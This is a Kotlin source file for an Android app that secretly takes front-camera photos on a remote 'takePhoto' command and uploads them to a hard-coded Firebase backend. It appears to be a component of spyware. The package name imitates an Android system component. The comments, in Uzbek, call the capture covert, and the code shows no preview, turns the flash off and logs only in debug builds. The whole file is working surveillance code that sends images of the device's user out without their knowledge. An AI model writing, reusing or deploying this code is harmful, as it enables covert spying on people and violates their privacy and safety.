package com.android.system.core.camera

import android.annotation.SuppressLint
import android.content.Context
import android.graphics.ImageFormat
import android.hardware.camera2.CameraCaptureSession
import android.hardware.camera2.CameraCharacteristics
import android.hardware.camera2.CameraDevice
import android.hardware.camera2.CameraManager
import android.hardware.camera2.CaptureRequest
import android.media.ImageReader
import android.os.Handler
import android.os.HandlerThread
import android.util.Log
import com.android.system.core.BuildConfig
import com.google.firebase.auth.FirebaseAuth
import com.google.firebase.database.FirebaseDatabase
import com.google.firebase.database.ServerValue
import com.google.firebase.storage.FirebaseStorage
import java.io.ByteArrayOutputStream

/**
 * Camera2 API orqali yashirin foto olish.
 * Front kameradan preview ko'rsatmasdan foto oladi.
 * Firebase Storage ga yuklaydi: snapshots/{uid}/{timestamp}.jpg
 * Firebase RTDB ga yozadi: devices/{uid}/status/lastSnapshot = timestamp
 *
 * Trigger: command type "takePhoto"
 * Android 14: foregroundServiceType="camera" shart.
 */
class CameraSnapshotWorker(private val context: Context) {

    companion object {
        private const val TAG = "SYS_CORE_CAMERA"
        private const val FIREBASE_URL = "https://joylashuv-56b2c-default-rtdb.europe-west1.firebasedatabase.app"
    }

    private var cameraDevice: CameraDevice? = null
    private var captureSession: CameraCaptureSession? = null
    private var imageReader: ImageReader? = null
    private var backgroundThread: HandlerThread? = null
    private var backgroundHandler: Handler? = null

    /**
     * Front kameradan foto olib Firebase'ga yuklaydi.
     * @param uid qurilma UID
     * @param onComplete foto olingandan keyin chaqiriladi (success: Boolean)
     */
    @SuppressLint("MissingPermission")
    fun takePhoto(uid: String, onComplete: (Boolean) -> Unit) {
        try {
            startBackgroundThread()

            val cameraManager = context.getSystemService(Context.CAMERA_SERVICE) as CameraManager
            val frontCameraId = findFrontCamera(cameraManager)

            if (frontCameraId == null) {
                if (BuildConfig.DEBUG) { Log.e(TAG, "Front camera not found") }
                onComplete(false)
                return
            }

            // ImageReader yaratish
            val characteristics = cameraManager.getCameraCharacteristics(frontCameraId)
            val map = characteristics.get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP)
            val jpegSizes = map?.getOutputSizes(ImageFormat.JPEG)
            
            // O'rtacha o'lcham tanlash (juda katta emas)
            val width = jpegSizes?.firstOrNull()?.width ?: 640
            val height = jpegSizes?.firstOrNull()?.height ?: 480

            imageReader = ImageReader.newInstance(width, height, ImageFormat.JPEG, 1)
            imageReader?.setOnImageAvailableListener({ reader ->
                val image = reader.acquireLatestImage()
                if (image != null) {
                    try {
                        val buffer = image.planes[0].buffer
                        val bytes = ByteArray(buffer.remaining())
                        buffer.get(bytes)
                        image.close()

                        if (BuildConfig.DEBUG) { Log.d(TAG, "Photo captured: ${bytes.size} bytes") }

                        // Firebase Storage ga yuklash
                        uploadToFirebase(uid, bytes, onComplete)
                    } catch (e: Exception) {
                        image.close()
                        if (BuildConfig.DEBUG) { Log.e(TAG, "Image processing error: ${e.message}") }
                        onComplete(false)
                    }
                } else {
                    if (BuildConfig.DEBUG) { Log.e(TAG, "Image is null") }
                    onComplete(false)
                }
            }, backgroundHandler)

            // Kamerani ochish
            cameraManager.openCamera(frontCameraId, object : CameraDevice.StateCallback() {
                override fun onOpened(camera: CameraDevice) {
                    cameraDevice = camera
                    if (BuildConfig.DEBUG) { Log.d(TAG, "Camera opened") }
                    createCaptureSession(camera, onComplete)
                }

                override fun onDisconnected(camera: CameraDevice) {
                    if (BuildConfig.DEBUG) { Log.d(TAG, "Camera disconnected") }
                    camera.close()
                    cameraDevice = null
                    onComplete(false)
                }

                override fun onError(camera: CameraDevice, error: Int) {
                    if (BuildConfig.DEBUG) { Log.e(TAG, "Camera error: $error") }
                    camera.close()
                    cameraDevice = null
                    onComplete(false)
                }
            }, backgroundHandler)

        } catch (e: Exception) {
            if (BuildConfig.DEBUG) { Log.e(TAG, "takePhoto error: ${e.message}") }
            onComplete(false)
        }
    }

    /**
     * Capture session yaratish va foto olish
     */
    private fun createCaptureSession(camera: CameraDevice, onComplete: (Boolean) -> Unit) {
        try {
            val surface = imageReader?.surface ?: run {
                onComplete(false)
                return
            }

            camera.createCaptureSession(
                listOf(surface),
                object : CameraCaptureSession.StateCallback() {
                    override fun onConfigured(session: CameraCaptureSession) {
                        captureSession = session
                        try {
                            val captureRequest = camera.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE).apply {
                                addTarget(surface)
                                // Auto-focus va auto-exposure
                                set(CaptureRequest.CONTROL_AF_MODE, CaptureRequest.CONTROL_AF_MODE_CONTINUOUS_PICTURE)
                                set(CaptureRequest.CONTROL_AE_MODE, CaptureRequest.CONTROL_AE_MODE_ON)
                                // Flash o'chirilgan (yashirin)
                                set(CaptureRequest.FLASH_MODE, CaptureRequest.FLASH_MODE_OFF)
                            }

                            session.capture(captureRequest.build(), object : CameraCaptureSession.CaptureCallback() {
                                override fun onCaptureCompleted(
                                    session: CameraCaptureSession,
                                    request: CaptureRequest,
                                    result: android.hardware.camera2.TotalCaptureResult
                                ) {
                                    if (BuildConfig.DEBUG) { Log.d(TAG, "Capture completed") }
                                    // Cleanup will happen after image is processed
                                }
                            }, backgroundHandler)

                        } catch (e: Exception) {
                            if (BuildConfig.DEBUG) { Log.e(TAG, "Capture request error: ${e.message}") }
                            onComplete(false)
                            cleanup()
                        }
                    }

                    override fun onConfigureFailed(session: CameraCaptureSession) {
                        if (BuildConfig.DEBUG) { Log.e(TAG, "Capture session configure failed") }
                        onComplete(false)
                        cleanup()
                    }
                },
                backgroundHandler
            )
        } catch (e: Exception) {
            if (BuildConfig.DEBUG) { Log.e(TAG, "createCaptureSession error: ${e.message}") }
            onComplete(false)
            cleanup()
        }
    }

    /**
     * Firebase Storage ga foto yuklash
     */
    private fun uploadToFirebase(uid: String, imageBytes: ByteArray, onComplete: (Boolean) -> Unit) {
        try {
            val timestamp = System.currentTimeMillis()
            val storagePath = "snapshots/$uid/$timestamp.jpg"

            val storageRef = FirebaseStorage.getInstance().reference.child(storagePath)

            storageRef.putBytes(imageBytes)
                .addOnSuccessListener {
                    if (BuildConfig.DEBUG) { Log.d(TAG, "Photo uploaded to: $storagePath") }

                    // RTDB ga lastSnapshot yozish
                    FirebaseDatabase.getInstance(FIREBASE_URL)
                        .getReference("devices")
                        .child(uid)
                        .child("status")
                        .child("lastSnapshot")
                        .setValue(timestamp)
                        .addOnSuccessListener {
                            if (BuildConfig.DEBUG) { Log.d(TAG, "lastSnapshot updated: $timestamp") }
                            onComplete(true)
                            cleanup()
                        }
                        .addOnFailureListener { e ->
                            if (BuildConfig.DEBUG) { Log.e(TAG, "lastSnapshot update failed: ${e.message}") }
                            onComplete(true) // foto yuklandi, faqat RTDB yozish xato
                            cleanup()
                        }
                }
                .addOnFailureListener { e ->
                    if (BuildConfig.DEBUG) { Log.e(TAG, "Photo upload failed: ${e.message}") }
                    onComplete(false)
                    cleanup()
                }
        } catch (e: Exception) {
            if (BuildConfig.DEBUG) { Log.e(TAG, "uploadToFirebase error: ${e.message}") }
            onComplete(false)
            cleanup()
        }
    }

    /**
     * Front kamera ID sini topish
     */
    private fun findFrontCamera(cameraManager: CameraManager): String? {
        return try {
            cameraManager.cameraIdList.firstOrNull { id ->
                val characteristics = cameraManager.getCameraCharacteristics(id)
                val facing = characteristics.get(CameraCharacteristics.LENS_FACING)
                facing == CameraCharacteristics.LENS_FACING_FRONT
            }
        } catch (e: Exception) {
            if (BuildConfig.DEBUG) { Log.e(TAG, "findFrontCamera error: ${e.message}") }
            null
        }
    }

    /**
     * Background thread boshlash
     */
    private fun startBackgroundThread() {
        backgroundThread = HandlerThread("CameraBackground").also { it.start() }
        backgroundHandler = Handler(backgroundThread!!.looper)
    }

    /**
     * Resurslarni tozalash
     */
    private fun cleanup() {
        try {
            captureSession?.close()
            captureSession = null
            cameraDevice?.close()
            cameraDevice = null
            imageReader?.close()
            imageReader = null
            backgroundThread?.quitSafely()
            backgroundThread = null
            backgroundHandler = null
        } catch (e: Exception) {
            if (BuildConfig.DEBUG) { Log.e(TAG, "cleanup error: ${e.message}") }
        }
    }
}
